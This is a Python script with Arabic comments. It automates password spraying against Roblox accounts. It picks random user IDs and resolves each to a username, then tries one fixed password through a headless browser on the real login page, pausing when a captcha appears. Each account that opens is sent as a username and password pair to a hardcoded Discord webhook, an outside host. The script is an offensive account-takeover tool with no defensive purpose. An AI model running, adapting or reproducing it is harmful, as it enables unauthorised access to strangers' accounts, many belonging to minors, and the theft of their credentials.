import requests
import random
import time
import sys
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from webdriver_manager.chrome import ChromeDriverManager

# --- إعدادات المستخدم النهائية ---
DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1395564556524191824/6gjDVUiguSSGzkiODa7QUdf-BsmE-hBG_03zrPWNgsfrA0EMbQtNtKh7cf6qfcqhHjKk"
FIXED_PASSWORD = "l0l0l0l"
WAIT_TIME = 30  # الانتظار بين المحاولات لتقليل الكابتشا
# -----------------------------------------

def print_now(text):
    print(text)
    sys.stdout.flush()

def check_login_real(username, password):
    """يفتح متصفح حقيقي داخل السيرفر ويجرب الدخول"""
    chrome_options = Options()
    chrome_options.add_argument("--headless") # تشغيل خفي (بدون نافذة)
    chrome_options.add_argument("--no-sandbox")
    chrome_options.add_argument("--disable-dev-shm-usage")
    chrome_options.add_argument("--disable-gpu")
    
    driver = None
    try:
        # استخدام ChromeDriverManager لتحميل التعريف تلقائياً
        service = Service(ChromeDriverManager().install())
        driver = webdriver.Chrome(service=service, options=chrome_options)
        driver.get("https://www.roblox.com/login")

        # انتظار تحميل صفحة تسجيل الدخول
        WebDriverWait(driver, 15).until(EC.presence_of_element_located((By.NAME, "username")))
        
        # إدخال اسم المستخدم وكلمة المرور
        driver.find_element(By.NAME, "username").send_keys(username)
        driver.find_element(By.NAME, "password").send_keys(password)
        driver.find_element(By.ID, "login-button").click()

        # انتظر قليلاً لترى النتيجة
        time.sleep(10) 

        # التحقق من نجاح تسجيل الدخول
        if "home.roblox.com" in driver.current_url or "users.roblox.com" in driver.current_url:
            return "SUCCESS"
        elif "captcha" in driver.page_source.lower():
            return "CAPTCHA"
        else:
            return "FAILED"
            
    except Exception as e:
        return f"ERROR: {e}"
    finally:
        if driver:
            driver.quit()

def main():
    print_now("🔥 بدء الفاحص الحقيقي على Render... سأرسل لك الحسابات الشغالة فقط!")
    print_now(f"كلمة المرور المستهدفة: {FIXED_PASSWORD}")
    
    while True:
        # 1. توليد ID والبحث عن اسم المستخدم
        user_id = f"12{random.randint(100000, 999999)}"
        try:
            res = requests.get(f"https://users.roblox.com/v1/users/{user_id}", timeout=10)
            if res.status_code == 200:
                username = res.json().get("name")
                if username:
                    print_now(f"🔍 وجدنا حساب: {username}.. جاري فحص كلمة المرور فعلياً...")
                    
                    # 2. فحص الدخول الحقيقي
                    status = check_login_real(username, FIXED_PASSWORD)
                    
                    if status == "SUCCESS":
                        print_now(f"✅✅ مبروك! الحساب شغال: {username}")
                        requests.post(DISCORD_WEBHOOK_URL, json={"content": f"🔥 **صيد حقيقي وشغال!**\n`{username}:{FIXED_PASSWORD}`"})
                    elif status == "CAPTCHA":
                        print_now(f"⚠️ ظهرت كابتشا.. سأنتظر {WAIT_TIME} ثانية لتجنب الحظر.")
                        time.sleep(WAIT_TIME)
                    elif status == "FAILED":
                        print_now(f"❌ كلمة المرور غير صحيحة للحساب: {username}")
                    else:
                        print_now(f"❗ خطأ تقني: {status}")
                    
                    # انتظار بسيط قبل الحساب التالي
                    time.sleep(5)
            else:
                time.sleep(1)
        except Exception as e:
            print_now(f"❗ خطأ في الاتصال بـ API روبلوكس: {e}")
            time.sleep(5)

if __name__ == "__main__":
    main()
